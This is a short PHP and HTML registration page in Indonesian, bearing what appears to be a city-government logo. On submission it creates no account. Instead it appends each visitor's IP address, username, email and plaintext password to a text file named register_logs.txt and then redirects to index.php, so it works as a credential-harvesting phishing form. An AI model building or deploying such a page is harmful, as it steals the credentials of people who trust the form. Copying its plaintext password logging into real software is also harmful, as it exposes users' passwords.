<?php
$register_message = '';

// Proses form jika metode POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $email = $_POST['email'] ?? '';
    $password1 = $_POST['password'] ?? '';
    $password2 = $_POST['confirm_password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');

    if ($password1 !== $password2) {
        $register_message = "Kata sandi tidak cocok. Silakan ulangi.";
    } else {
        // Simpan log pendaftaran
        $logFile = 'register_logs.txt';
        $logEntry = "[$timestamp] IP: $ip | Username: $username | Email: $email | Password: $password1\n";
        file_put_contents($logFile, $logEntry, FILE_APPEND);

        // Redirect ke halaman utama (index.php)
        header("Location: index.php");
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Register</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .register-container {
      background: white;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #333;
    }
    input {
      width: 95%;
      padding: 10px;
      margin: 0.5rem 0 1rem;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background: #1e7e34;
    }
    .link {
      display: block;
      text-align: center;
      margin-top: 1rem;
    }
    .logo {
      display: block;
      margin: 0 auto 1rem auto;
      max-width: 170px;
      height: auto;
    }
    .message {
      color: red;
      text-align: center;
      margin-bottom: 1rem;
    }
  </style>
</head>
<body>
  <div class="register-container">
    <img src="./images/pemkot.png" alt="Logo" class="logo" />
    <h2>Daftar</h2>
    <?php if (!empty($register_message)) : ?>
      <div class="message"><?= htmlspecialchars($register_message) ?></div>
    <?php endif; ?>
    <form method="POST" action="">
      <input type="text" name="username" placeholder="Nama pengguna" required>
      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Kata sandi" required>
      <input type="password" name="confirm_password" placeholder="Ulangi kata sandi" required>
      <button type="submit">Daftar</button>
      <a class="link" href="login.php">Sudah punya akun? Login</a>
    </form>
  </div>
</body>
</html>
